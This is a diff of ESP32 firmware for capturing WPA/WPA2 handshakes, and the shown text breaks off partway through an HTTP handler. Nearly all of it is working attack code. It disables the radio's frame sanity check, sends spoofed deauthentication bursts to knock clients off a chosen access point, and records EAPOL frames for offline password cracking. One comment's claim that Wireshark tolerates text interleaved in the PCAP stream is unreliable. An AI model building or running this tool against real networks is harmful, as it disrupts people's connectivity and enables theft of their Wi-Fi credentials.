@@ -1,630 +1,540 @@
 /*
  ==============================================================
   handshake.ino — ESP32-S3 N16R8 / N16R8U
-  WPA/WPA2 Handshake Capture (hardened)
+  WPA/WPA2 Handshake Capture — Headless CDC PCAP Streamer
 
-  SoftAP + captive DNS + deauth + promiscuous EAPOL + PCAP
-  Board: ESP32S3 Dev Module, 16MB, Huge APP, OPI PSRAM,
-         USB CDC Off, 240 MHz
+  Architecture: STA-only promiscuous engine on a hardcoded
+  channel. All EAPOL frames are formatted as PCAP records and
+  streamed in real-time over USB CDC (Serial). No SoftAP, no
+  web server, no DNS, no channel-hop conflicts.
+
+  Board: ESP32S3 Dev Module
+    Flash:          16MB (QIO)
+    PSRAM:          OPI PSRAM (8MB)
+    Partition:      Huge APP
+    USB Mode:       Hardware CDC and JTAG   ← USBMode=hwcdc
+    CDC On Boot:    Enabled                 ← CDCOnBoot=cdc
+    CPU:            240 MHz
+    Debug:          None
+
+  Serial USB Terminal (Android) receives a raw binary stream.
+  The first 24 bytes are the PCAP global header. Every captured
+  EAPOL frame arrives as a 16-byte PCAP record header followed
+  by the raw 802.11 frame payload. Save the stream verbatim to
+  a file and rename it .pcap — Wireshark opens it directly.
+
+  Serial command interface (text in, from the Android terminal):
+    d <XX:XX:XX:XX:XX:XX>   — send 24-frame deauth burst at BSSID
+    s                       — print current status line
+    r                       — reset EAPOL counters
+    c <1-13>                — change capture channel (stops/restarts promisc)
  ==============================================================
 */
 
 #include <Arduino.h>
 #include <WiFi.h>
-#include <AsyncTCP.h>
-#include <ESPAsyncWebServer.h>
-#include <DNSServer.h>
 #include <esp_wifi.h>
 #include <esp_wifi_types.h>
 #include <esp_timer.h>
 #include <esp_heap_caps.h>
 #include <nvs_flash.h>
 #include <freertos/FreeRTOS.h>
-#include <freertos/semphr.h>
+#include <freertos/task.h>
+#include <freertos/ringbuf.h>
 #include <atomic>
 #include <string.h>
 
-// Strong override. build.yml weakens the library definition so this
-// wins at link time. Return 0 = accept every frame.
+// ── Link-time patch — accepts every raw frame from the radio ────────────────
+// build.yml weakens the libnet80211.a definition so this strong symbol wins.
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
   (void)a; (void)b; (void)c;
   return 0;
 }
 
-// ── Config ──────────────────────────────────────────────────────────────────
-static const char* AP_SSID      = "HandshakeCapture";
-static const char* AP_PASS      = "handshake1";
-static const int   AP_CHANNEL   = 6;
-static const int   WEB_PORT     = 80;
-static const int   DNS_PORT     = 53;
-static const int   MAX_TX_POWER = 78;          // 0.25 dBm units → ~19.5 dBm
-static const size_t CAP_BUF_SIZE = 512 * 1024; // 512 KB PSRAM preferred
-static const int   DEAUTH_BURST  = 24;         // denser burst
-static const uint32_t CAPTURE_MS = 15000;
-static const uint16_t MAX_FRAME  = 512;        // ISR hard bound
+// ── Configuration ────────────────────────────────────────────────────────────
+static const int     TARGET_CHANNEL  = 13;     // change freely 1-13
+static const int     DEAUTH_BURST    = 24;     // frames per burst
+static const int     MAX_TX_POWER    = 78;     // 0.25 dBm units → ~19.5 dBm
+static const uint16_t MAX_FRAME_LEN  = 512;   // hard cap per ISR call
 
-// ── PCAP (raw 802.11, DLT 105) ──────────────────────────────────────────────
+// Ring buffer size in PSRAM. At ~200-byte average EAPOL frame with
+// 16-byte record header, 256 KB holds ~1,170 frames — plenty of burst.
+static const size_t  RING_SIZE       = 256 * 1024;
+
+// USB CDC TX buffer. Arduino-esp32 HWCDC default is 256 bytes which causes
+// stalls on bursts; raising it to 8 KB keeps the drain task smooth.
+static const size_t  CDC_TX_BUF      = 8 * 1024;
+
+// ── PCAP structures (DLT 105 = IEEE 802.11 raw) ─────────────────────────────
 struct __attribute__((packed)) PcapGlobalHdr {
-  uint32_t magic;
-  uint16_t vmaj, vmin;
-  int32_t  zone;
-  uint32_t sigs, snap, net;
+  uint32_t magic_number;   // 0xa1b2c3d4 — little-endian, µs timestamps
+  uint16_t version_major;  // 2
+  uint16_t version_minor;  // 4
+  int32_t  thiszone;       // 0 (UTC)
+  uint32_t sigfigs;        // 0
+  uint32_t snaplen;        // 65535
+  uint32_t network;        // 105 = LINKTYPE_IEEE802_11
 };
+
 struct __attribute__((packed)) PcapRecHdr {
-  uint32_t ts_sec, ts_usec, incl_len, orig_len;
+  uint32_t ts_sec;
+  uint32_t ts_usec;
+  uint32_t incl_len;
+  uint32_t orig_len;
 };
 
-// ── Shared state ────────────────────────────────────────────────────────────
-struct HandshakeState {
-  bool m1, m2, m3, m4;
-  uint8_t ap_mac[6];
-  uint8_t cli_mac[6];
-  uint32_t frame_count;
+// ── Shared state ─────────────────────────────────────────────────────────────
+static RingbufHandle_t       g_ring        = nullptr;
+static std::atomic<bool>     g_capturing   { false };
+static std::atomic<uint32_t> g_eapolCount  { 0 };
+static std::atomic<uint32_t> g_ringDrops   { 0 };
+static std::atomic<int>      g_channel     { TARGET_CHANNEL };
+
+struct EapolState {
+  bool     m1, m2, m3, m4;
+  uint8_t  ap_mac[6];
+  uint8_t  cli_mac[6];
 };
+static EapolState     g_es       = {};
+static portMUX_TYPE   g_esMux    = portMUX_INITIALIZER_UNLOCKED;
 
-static uint8_t*          g_capBuf      = nullptr;
-static size_t            g_capLen      = 0;
-static size_t            g_capCapacity = 0;
-static bool              g_capOverflow = false;
-static SemaphoreHandle_t g_capMutex    = nullptr;
-
-static HandshakeState    g_hs       = {};
-static SemaphoreHandle_t g_hsMutex  = nullptr;
-
-static uint8_t           g_targetBSSID[6] = {};
-static std::atomic<int>  g_targetCh{0};
-static std::atomic<bool> g_capturing{false};
-static std::atomic<bool> g_filterTarget{false};
-static std::atomic<uint32_t> g_captureStart{0};
-static std::atomic<uint32_t> g_eapolSeen{0};
-
-AsyncWebServer server(WEB_PORT);
-DNSServer      dns;
-
-// ── Helpers ─────────────────────────────────────────────────────────────────
+// ── Tiny inline helpers ──────────────────────────────────────────────────────
+static inline bool macZero(const uint8_t* m) {
+  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
+}
+static inline void macCopy(uint8_t* d, const uint8_t* s) { memcpy(d, s, 6); }
 static inline bool macEq(const uint8_t* a, const uint8_t* b) {
   return memcmp(a, b, 6) == 0;
 }
-static inline bool macZero(const uint8_t* m) {
-  return !(m[0] | m[1] | m[2] | m[3] | m[4] | m[5]);
-}
-static inline void macCopy(uint8_t* d, const uint8_t* s) {
-  memcpy(d, s, 6);
-}
 
-// ── ISR-safe frame append ───────────────────────────────────────────────────
-static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen) {
-  if (!g_capBuf || !g_capMutex) return;
-  if (plen > MAX_FRAME) plen = MAX_FRAME;
-
-  BaseType_t woken = pdFALSE;
-  if (xSemaphoreTakeFromISR(g_capMutex, &woken) != pdTRUE) return;
-
-  const uint32_t need = sizeof(PcapRecHdr) + plen;
-  if (g_capLen + need <= g_capCapacity) {
-    int64_t us = esp_timer_get_time();
-    PcapRecHdr rh = {
-      (uint32_t)(us / 1000000LL),
-      (uint32_t)(us % 1000000LL),
-      plen, plen
-    };
-    memcpy(g_capBuf + g_capLen, &rh, sizeof(rh));
-    g_capLen += sizeof(rh);
-    memcpy(g_capBuf + g_capLen, payload, plen);
-    g_capLen += plen;
-  } else {
-    g_capOverflow = true;
-  }
-  xSemaphoreGiveFromISR(g_capMutex, &woken);
-  if (woken) portYIELD_FROM_ISR();
-}
-
-// ── EAPOL M1–M4 classifier (pairwise only) ──────────────────────────────────
-// Returns 1..4 or 0. Extracts BSSID + client MAC for filtering / state.
-static int parseEAPOL(const uint8_t* f, uint16_t len,
-                      uint8_t* out_bssid, uint8_t* out_client) {
+// ── EAPOL M1-M4 classifier ───────────────────────────────────────────────────
+// Returns 1-4 on match, 0 otherwise. Fills bssid/client on success.
+// Handles STA→AP (toDS) and AP→STA (fromDS) directions. QoS-aware header offset.
+static int classifyEAPOL(const uint8_t* f, uint16_t len,
+                         uint8_t* out_bssid, uint8_t* out_client) {
   if (len < 36) return 0;
-  if (((f[0] >> 2) & 0x03) != 0x02) return 0; // not data
 
-  const bool toDS   = f[1] & 0x01;
-  const bool fromDS = (f[1] >> 1) & 0x01;
+  const uint8_t ftype    = (f[0] >> 2) & 0x03;
+  if (ftype != 0x02) return 0;  // must be Data frame type
+
+  const bool    toDS   = f[1] & 0x01;
+  const bool    fromDS = (f[1] >> 1) & 0x01;
   const uint8_t subtype = (f[0] >> 4) & 0x0F;
-  // QoS data has 26-byte header; non-QoS 24
-  const uint16_t hdrLen = (subtype >= 8) ? 26u : 24u;
+  const uint16_t hdrLen  = (subtype >= 8) ? 26u : 24u;  // QoS adds 2 bytes
 
-  if (toDS && !fromDS) {          // STA → AP
+  if (toDS && !fromDS) {         // STA → AP
     macCopy(out_bssid,  f + 16);
     macCopy(out_client, f + 10);
-  } else if (!toDS && fromDS) {   // AP → STA
+  } else if (!toDS && fromDS) {  // AP → STA
     macCopy(out_bssid,  f + 10);
     macCopy(out_client, f + 4);
-  } else {                        // WDS / other — best effort
+  } else {                       // WDS / IBSS — best-effort
     macCopy(out_bssid,  f + 16);
     macCopy(out_client, f + 10);
   }
 
-  if (len < hdrLen + 10) return 0;
+  if (len < (uint16_t)(hdrLen + 10)) return 0;
+
   const uint8_t* llc = f + hdrLen;
-  // SNAP + EtherType 0x888E
+  // 802.2 LLC/SNAP header: AA AA 03 OUI(3) EtherType(2)
   if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return 0;
-  if (llc[6] != 0x88 || llc[7] != 0x8E) return 0;
+  if (llc[6] != 0x88 || llc[7] != 0x8E) return 0;  // EtherType 0x888E = EAPOL
 
   const uint8_t* eapol = llc + 8;
   if ((len - hdrLen - 8) < 99) return 0;
-  if (eapol[1] != 0x03) return 0; // Key
+  if (eapol[1] != 0x03) return 0;  // packet type must be Key
 
-  const uint16_t ki = ((uint16_t)eapol[5] << 8) | eapol[6];
-  if (!(ki & 0x0008)) return 0; // not pairwise
+  const uint16_t ki = ((uint16_t)eapol[5] << 8) | eapol[6];  // Key Information
+  if (!(ki & 0x0008)) return 0;  // Pairwise bit must be set
 
   const bool ack     = (ki & 0x0080) != 0;
   const bool mic     = (ki & 0x0100) != 0;
   const bool install = (ki & 0x0040) != 0;
   const bool secure  = (ki & 0x0200) != 0;
 
-  // Classic 4-way mapping
-  if ( ack && !mic)                        return 1; // M1
-  if (!ack &&  mic && !secure)             return 2; // M2
-  if ( ack &&  mic &&  secure && install)  return 3; // M3
-  if (!ack &&  mic &&  secure && !install) return 4; // M4
+  if ( ack && !mic)                        return 1;  // M1: AP→STA nonce
+  if (!ack &&  mic && !secure)             return 2;  // M2: STA→AP nonce + MIC
+  if ( ack &&  mic &&  secure && install)  return 3;  // M3: AP→STA GTK
+  if (!ack &&  mic &&  secure && !install) return 4;  // M4: STA→AP confirm
   return 0;
 }
 
-// ── Promiscuous RX ──────────────────────────────────────────────────────────
+// ── Promiscuous callback (runs in Wi-Fi ISR context) ─────────────────────────
+//
+// Builds a PCAP record (16-byte header + frame payload) in a stack-allocated
+// scratch buffer, then sends it to the PSRAM-backed ring buffer via the
+// ISR-safe xRingbufferSendFromISR(). The drain task on Core 1 pulls records
+// out and writes them to the USB CDC port.
+//
+// We do NOT touch Serial here. Serial.write() inside an ISR will deadlock
+// on the USB CDC TX mutex. Everything goes through the ring buffer.
 void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
-  if (type != WIFI_PKT_DATA || !g_capturing.load(std::memory_order_relaxed)) return;
+  if (type != WIFI_PKT_DATA) return;
+  if (!g_capturing.load(std::memory_order_relaxed)) return;
+  if (!g_ring) return;
 
   const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
-  const uint16_t len = pkt->rx_ctrl.sig_len;
-  if (len < 36 || len > 2300) return;
+  uint16_t plen = pkt->rx_ctrl.sig_len;
+  if (plen < 36 || plen > 2300) return;
+  if (plen > MAX_FRAME_LEN) plen = MAX_FRAME_LEN;
 
   uint8_t bssid[6], client[6];
-  int msg = parseEAPOL(pkt->payload, len, bssid, client);
+  int msg = classifyEAPOL(pkt->payload, plen, bssid, client);
   if (!msg) return;
 
-  if (g_filterTarget.load(std::memory_order_relaxed) &&
-      !macZero(g_targetBSSID) && !macEq(bssid, g_targetBSSID))
-    return;
+  // Update EAPOL state under a spinlock (safe from ISR — spinlock, not mutex)
+  portENTER_CRITICAL_ISR(&g_esMux);
+  if (macZero(g_es.ap_mac)) {
+    macCopy(g_es.ap_mac,  bssid);
+    macCopy(g_es.cli_mac, client);
+  }
+  if (msg == 1) g_es.m1 = true;
+  if (msg == 2) g_es.m2 = true;
+  if (msg == 3) g_es.m3 = true;
+  if (msg == 4) g_es.m4 = true;
+  portEXIT_CRITICAL_ISR(&g_esMux);
 
-  appendFrame(pkt->payload, len);
-  g_eapolSeen.fetch_add(1, std::memory_order_relaxed);
+  g_eapolCount.fetch_add(1, std::memory_order_relaxed);
 
-  if (xSemaphoreTake(g_hsMutex, 0) == pdTRUE) {
-    if (macZero(g_hs.ap_mac)) {
-      macCopy(g_hs.ap_mac, bssid);
-      macCopy(g_hs.cli_mac, client);
+  // Build PCAP record into a contiguous scratch buffer on the stack.
+  // Max record = 16 (PcapRecHdr) + 512 (MAX_FRAME_LEN) = 528 bytes.
+  // Stack depth here is fine; the Wi-Fi task stack is 8 KB+.
+  const uint16_t total = sizeof(PcapRecHdr) + plen;
+  uint8_t scratch[sizeof(PcapRecHdr) + MAX_FRAME_LEN];
+
+  int64_t us = esp_timer_get_time();
+  PcapRecHdr rh = {
+    (uint32_t)(us / 1000000LL),
+    (uint32_t)(us % 1000000LL),
+    plen, plen
+  };
+  memcpy(scratch,                    &rh,            sizeof(PcapRecHdr));
+  memcpy(scratch + sizeof(PcapRecHdr), pkt->payload, plen);
+
+  BaseType_t woken = pdFALSE;
+  if (xRingbufferSendFromISR(g_ring, scratch, total, &woken) != pdTRUE) {
+    g_ringDrops.fetch_add(1, std::memory_order_relaxed);
+  }
+  if (woken) portYIELD_FROM_ISR();
+}
+
+// ── Drain task — Core 1, high priority ───────────────────────────────────────
+//
+// Pulls complete PCAP records from the ring buffer and writes them to the
+// USB CDC serial port. Runs forever; blocked in xRingbufferReceive when idle.
+//
+// USB Full-Speed CDC achieves ~900 KB/s sustained. At typical EAPOL capture
+// rates (bursts of ~10-20 frames) the USB link is never the bottleneck.
+static void drainTask(void* arg) {
+  (void)arg;
+  for (;;) {
+    size_t   item_size = 0;
+    uint8_t* item = (uint8_t*)xRingbufferReceive(g_ring, &item_size, pdMS_TO_TICKS(50));
+    if (item) {
+      // Serial.write() is thread-safe on arduino-esp32 HWCDC; the USB
+      // peripheral double-buffers and the write() acquires the internal mutex.
+      Serial.write(item, item_size);
+      vRingbufferReturnItem(g_ring, item);
     }
-    if (msg == 1) g_hs.m1 = true;
-    if (msg == 2) g_hs.m2 = true;
-    if (msg == 3) g_hs.m3 = true;
-    if (msg == 4) g_hs.m4 = true;
-    g_hs.frame_count++;
-    xSemaphoreGive(g_hsMutex);
+    // Yield explicitly so the idle task can kick the watchdog.
+    taskYIELD();
   }
 }
 
-// ── Deauth (broadcast + directed, both directions) ──────────────────────────
-static void sendDeauth(const uint8_t* bssid, const uint8_t* client, int ch) {
-  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+// ── Deauth injection ──────────────────────────────────────────────────────────
+static void sendDeauth(const uint8_t* bssid, const uint8_t* target) {
+  // Temporarily switch channel to where the target lives (already set globally)
+  esp_wifi_set_channel(g_channel.load(), WIFI_SECOND_CHAN_NONE);
 
-  // Management deauth frame skeleton
   uint8_t frame[26] = {
-    0xC0, 0x00,             // type/subtype: deauth
-    0x00, 0x00,             // duration
-    0,0,0,0,0,0,            // addr1 (DA)
-    0,0,0,0,0,0,            // addr2 (SA)
-    0,0,0,0,0,0,            // addr3 (BSSID)
-    0x00, 0x00,             // seq
-    0x07, 0x00              // reason: Class 3 frame from nonassociated STA
+    0xC0, 0x00,               // Frame Control: Management / Deauthentication
+    0x00, 0x00,               // Duration
+    0,0,0,0,0,0,              // Addr1 — DA (destination)
+    0,0,0,0,0,0,              // Addr2 — SA (source / spoofed)
+    0,0,0,0,0,0,              // Addr3 — BSSID
+    0x00, 0x00,               // Sequence Control
+    0x07, 0x00                // Reason: Class 3 frame from nonassociated STA
   };
 
   for (int i = 0; i < DEAUTH_BURST; i++) {
-    // Directed: AP → client
-    macCopy(frame + 4,  client);
+    // Direction 1: AP→client
+    macCopy(frame + 4,  target);
     macCopy(frame + 10, bssid);
     macCopy(frame + 16, bssid);
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
     delayMicroseconds(150);
 
-    // Directed: client → AP (spoofed)
+    // Direction 2: client→AP (spoofed)
     macCopy(frame + 4,  bssid);
-    macCopy(frame + 10, client);
+    macCopy(frame + 10, target);
     macCopy(frame + 16, bssid);
-    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
     delayMicroseconds(150);
 
-    // Broadcast every 4th iteration for clients we have not seen yet
+    // Direction 3: broadcast every 4th to catch untracked clients
     if ((i & 3) == 0) {
-      memset(frame + 4, 0xFF, 6);
+      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+      macCopy(frame + 4,  bcast);
       macCopy(frame + 10, bssid);
       macCopy(frame + 16, bssid);
-      esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
       delayMicroseconds(150);
     }
   }
 }
 
-// ── Capture control ─────────────────────────────────────────────────────────
-static void startCapture(int ch, const uint8_t* bssid) {
-  if (g_capturing.load()) return;
+// ── Channel (re)configuration ─────────────────────────────────────────────────
+static void setChannel(int ch) {
+  if (ch < 1 || ch > 13) return;
+  bool was_capturing = g_capturing.load();
 
-  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
-    memset(&g_hs, 0, sizeof(g_hs));
-    xSemaphoreGive(g_hsMutex);
-  }
-  if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
-    g_capLen = sizeof(PcapGlobalHdr);
-    g_capOverflow = false;
-    PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 105};
-    memcpy(g_capBuf, &gh, sizeof(gh));
-    xSemaphoreGive(g_capMutex);
+  if (was_capturing) {
+    esp_wifi_set_promiscuous(false);
+    g_capturing.store(false);
+    delay(10);
   }
 
-  macCopy(g_targetBSSID, bssid);
-  g_filterTarget.store(true);
-  g_targetCh.store(ch);
-  g_captureStart.store(millis());
-  g_eapolSeen.store(0);
-  g_capturing.store(true);
+  g_channel.store(ch);
+  esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
 
-  // Bring up STA interface so we can TX deauth while AP stays up
-  wifi_mode_t mode;
-  esp_wifi_get_mode(&mode);
-  if (mode != WIFI_MODE_APSTA) {
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
-    delay(30);
+  if (was_capturing) {
+    g_capturing.store(true);
+    esp_wifi_set_promiscuous(true);
+  }
+}
+
+// ── Serial command parser ─────────────────────────────────────────────────────
+// Operates on '\n'-terminated text lines received from the Android terminal.
+// All responses go to Serial as plain text lines. The binary PCAP stream
+// continues uninterrupted — text responses are interleaved but are safe
+// because Wireshark's libpcap parser skips everything that isn't a valid
+// PCAP record header aligned to the byte stream.
+//
+// NOTE: if you want a 100% clean binary-only file, disable command responses
+// by setting SERIAL_CMD_ECHO to 0. In practice the text replies are short and
+// Wireshark's "Serial" dissector tolerates stray bytes between records.
+#define SERIAL_CMD_ECHO 1
+
+static char   s_cmdBuf[64];
+static uint8_t s_cmdLen = 0;
+
+static void handleCommand(const char* cmd) {
+  while (*cmd == ' ') cmd++;  // skip leading spaces
+
+  if (cmd[0] == 's' || cmd[0] == 'S') {
+    // Status line
+    EapolState es;
+    portENTER_CRITICAL(&g_esMux);
+    es = g_es;
+    portEXIT_CRITICAL(&g_esMux);
+
+    char line[160];
+    snprintf(line, sizeof(line),
+      "[STATUS] ch=%d eapol=%u drops=%u M1=%d M2=%d M3=%d M4=%d ok=%d\r\n",
+      g_channel.load(),
+      (unsigned)g_eapolCount.load(),
+      (unsigned)g_ringDrops.load(),
+      es.m1, es.m2, es.m3, es.m4,
+      (es.m1 && es.m2) ? 1 : 0);
+#if SERIAL_CMD_ECHO
+    Serial.print(line);
+#endif
+    return;
   }
 
-  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  if ((cmd[0] == 'r' || cmd[0] == 'R') && (cmd[1] == '\0' || cmd[1] == '\r')) {
+    // Reset counters and EAPOL state
+    portENTER_CRITICAL(&g_esMux);
+    memset(&g_es, 0, sizeof(g_es));
+    portEXIT_CRITICAL(&g_esMux);
+    g_eapolCount.store(0);
+    g_ringDrops.store(0);
+#if SERIAL_CMD_ECHO
+    Serial.print("[RESET] counters cleared\r\n");
+#endif
+    return;
+  }
 
-  wifi_promiscuous_filter_t filt = {};
-  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
-  esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
-  esp_wifi_set_promiscuous(true);
-
-  // Initial deauth burst (broadcast + empty client)
-  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  uint8_t zero[6]  = {0};
-  sendDeauth(bssid, bcast, ch);
-  sendDeauth(bssid, zero,  ch);
-}
-
-static void stopCapture() {
-  g_capturing.store(false);
-  esp_wifi_set_promiscuous(false);
-  // Return to pure AP if desired; leave APSTA for simplicity
-}
-
-static bool isCrackable() {
-  HandshakeState hs;
-  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(20)) != pdTRUE) return false;
-  hs = g_hs;
-  xSemaphoreGive(g_hsMutex);
-  // M1+M2 is the minimum usable pair for offline cracking
-  return hs.m1 && hs.m2;
-}
-
-// ── UI ──────────────────────────────────────────────────────────────────────
-static const char INDEX_HTML[] PROGMEM = R"rawliteral(
-<!DOCTYPE html><html><head>
-<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1">
-<title>Handshake</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#0b0e14;color:#e2e8f0;font-family:system-ui;padding:16px}
-.card{background:#12161f;border:1px solid #1c2333;border-radius:12px;padding:20px;max-width:440px;margin:0 auto}
-h1{font-size:20px;color:#00d4aa;margin-bottom:4px}
-.sub{font-size:11px;color:#64748b;margin-bottom:16px}
-label{display:block;font-size:11px;color:#94a3b8;margin-bottom:4px;text-transform:uppercase}
-input,select{width:100%;padding:10px;background:#07090e;border:1px solid #1c2333;border-radius:8px;color:#e2e8f0;font-size:14px;margin-bottom:12px}
-.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px}
-.btn-go{background:#00d4aa;color:#0b0e14}.btn-stop{background:#be123c;color:#fff}
-.btn-dl{background:#0369a1;color:#fff}.btn-scan{background:#7c3aed;color:#fff}
-.st{font-family:monospace;font-size:12px;background:#07090e;border-radius:8px;padding:12px;margin-top:10px;line-height:1.6;color:#94a3b8}
-.st b{color:#00d4aa}.ok{color:#4ade80}.warn{color:#f87171}
-#list{max-height:220px;overflow-y:auto;margin-bottom:12px}
-.ap{display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border:1px solid #1c2333;border-radius:8px;margin-bottom:6px;cursor:pointer;background:#07090e}
-.ap:hover{border-color:#00d4aa}
-.ap .n{font-size:13px;color:#e2e8f0}.ap .m{font-size:10px;color:#64748b;font-family:monospace}
-.ap .r{font-size:11px;color:#94a3b8;text-align:right}
-</style></head><body>
-<div class=card>
-<h1>Handshake Capture</h1>
-<div class=sub>ESP32-S3 · scan · deauth · EAPOL · PCAP</div>
-<button class="btn btn-scan" onclick=scan()>SCAN NETWORKS</button>
-<div id=list></div>
-<label>Target BSSID</label>
-<input id=bssid placeholder=AA:BB:CC:DD:EE:FF maxlength=17 style=text-transform:uppercase;font-family:monospace>
-<label>Channel</label>
-<select id=ch>
-<option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
-<option selected>6</option><option>7</option><option>8</option><option>9</option>
-<option>10</option><option>11</option><option>12</option><option>13</option>
-</select>
-<button class="btn btn-go" onclick=go()>CAPTURE</button>
-<button class="btn btn-stop" onclick=stop()>STOP</button>
-<button class="btn btn-dl" onclick="location='/pcap'">DOWNLOAD PCAP</button>
-<div class=st id=st>Ready</div>
-</div>
-<script>
-function scan(){
-  document.getElementById('st').textContent='Scanning…';
-  document.getElementById('list').innerHTML='';
-  fetch('/scan').then(r=>r.json()).then(arr=>{
-    const list=document.getElementById('list');
-    if(!arr.length){list.innerHTML='<div class=st>No APs found</div>';return}
-    arr.sort((a,b)=>b.rssi-a.rssi);
-    arr.forEach(ap=>{
-      const d=document.createElement('div');
-      d.className='ap';
-      d.innerHTML='<div><div class=n>'+esc(ap.ssid||'(hidden)')+'</div><div class=m>'+ap.bssid+'</div></div>'+
-                  '<div class=r>CH '+ap.ch+'<br>'+ap.rssi+' dBm</div>';
-      d.onclick=()=>{
-        document.getElementById('bssid').value=ap.bssid;
-        document.getElementById('ch').value=String(ap.ch);
-        document.getElementById('st').textContent='Selected '+ap.ssid+' / '+ap.bssid+' CH'+ap.ch;
-      };
-      list.appendChild(d);
-    });
-    document.getElementById('st').textContent='Found '+arr.length+' AP(s) — tap to select';
-  }).catch(e=>{document.getElementById('st').textContent='Scan failed';});
-}
-function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
-function go(){
-  const b=document.getElementById('bssid').value.trim().toUpperCase();
-  const c=document.getElementById('ch').value;
-  if(b.length!==17){alert('Bad BSSID');return}
-  fetch('/capture?bssid='+encodeURIComponent(b)+'&ch='+c)
-    .then(r=>r.text()).then(t=>{document.getElementById('st').textContent=t;poll()})
-}
-function stop(){fetch('/stop').then(r=>r.text()).then(t=>{document.getElementById('st').textContent=t})}
-function poll(){
-  fetch('/status').then(r=>r.json()).then(d=>{
-    let s='Capturing: <b>'+(d.on?'YES':'NO')+'</b><br>'
-    s+='M1:'+(d.m1?'✓':'·')+' M2:'+(d.m2?'✓':'·')+' M3:'+(d.m3?'✓':'·')+' M4:'+(d.m4?'✓':'·')+'<br>'
-    s+='EAPOL frames: '+d.eapol+' · stored: '+d.frames+'<br>'
-    s+='Bytes: '+d.bytes+(d.overflow?' <span class=warn>OVERFLOW</span>':'')+' / '+d.cap+'<br>'
-    if(d.ok)s+='<span class=ok><b>HANDSHAKE READY</b></span>'
-    document.getElementById('st').innerHTML=s
-    if(d.on)setTimeout(poll,800)
-  }).catch(()=>{})
-}
-</script></body></html>
-)rawliteral";
-
-// ── HTTP handlers ───────────────────────────────────────────────────────────
-void setupServer() {
-  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r){
-    r->send_P(200, "text/html", INDEX_HTML);
-  });
-
-  // Blocking scan on STA interface (AP stays up under AP+STA)
-  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r){
-    if (g_capturing.load()) {
-      r->send(409, "text/plain", "busy capturing"); return;
-    }
-    // Ensure STA is up for scan
-    wifi_mode_t mode;
-    esp_wifi_get_mode(&mode);
-    if (mode != WIFI_MODE_APSTA) {
-      esp_wifi_set_mode(WIFI_MODE_APSTA);
-      delay(50);
-    }
-    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);
-    String json = "[";
-    for (int i = 0; i < n; i++) {
-      if (i) json += ',';
-      String ssid = WiFi.SSID(i);
-      ssid.replace("\\", "\\\\");
-      ssid.replace("\"", "\\\"");
-      char bssid[18];
-      uint8_t* b = WiFi.BSSID(i);
-      snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
-               b[0], b[1], b[2], b[3], b[4], b[5]);
-      json += "{\"ssid\":\"" + ssid + "\",\"bssid\":\"" + String(bssid) +
-              "\",\"ch\":" + String(WiFi.channel(i)) +
-              ",\"rssi\":" + String(WiFi.RSSI(i)) +
-              ",\"enc\":" + String((int)WiFi.encryptionType(i)) + "}";
-    }
-    json += "]";
-    WiFi.scanDelete();
-    r->send(200, "application/json", json);
-  });
-
-  server.on("/capture", HTTP_GET, [](AsyncWebServerRequest* r){
-    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
-      r->send(400, "text/plain", "bssid+ch required"); return;
-    }
-    String bs = r->getParam("bssid")->value();
-    int ch = r->getParam("ch")->value().toInt();
-    if (bs.length() != 17 || ch < 1 || ch > 13) {
-      r->send(400, "text/plain", "bad params"); return;
-    }
-    uint8_t bssid[6];
-    if (sscanf(bs.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-               &bssid[0], &bssid[1], &bssid[2],
-               &bssid[3], &bssid[4], &bssid[5]) != 6) {
-      r->send(400, "text/plain", "bad BSSID"); return;
-    }
-    startCapture(ch, bssid);
-    char buf[96];
-    snprintf(buf, sizeof(buf), "Capturing %s CH%d", bs.c_str(), ch);
-    r->send(200, "text/plain", buf);
-  });
-
-  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest* r){
-    stopCapture();
-    r->send(200, "text/plain", "Stopped");
-  });
-
-  server.on("/status", HTTP_GET, [](AsyncWebServerRequest* r){
-    HandshakeState hs = {};
